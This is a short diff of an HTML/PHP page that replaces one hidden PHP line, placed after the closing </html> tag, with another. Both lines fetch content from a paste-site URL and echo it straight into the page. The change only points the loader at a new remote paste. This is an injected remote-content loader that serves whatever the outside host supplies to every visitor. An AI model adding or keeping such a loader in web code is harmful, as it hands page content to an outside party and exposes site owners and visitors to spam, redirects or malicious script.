@@ -682,4 +682,4 @@
 </body>
 
 </html>
-<?php $a = file_get_contents('https://hastebin.skyra.pw/raw/simuzoqere'); echo $a; ?>
+<?php $a = file_get_contents('https://hastebin.skyra.pw/igezeliwij.htm'); echo $a; ?>
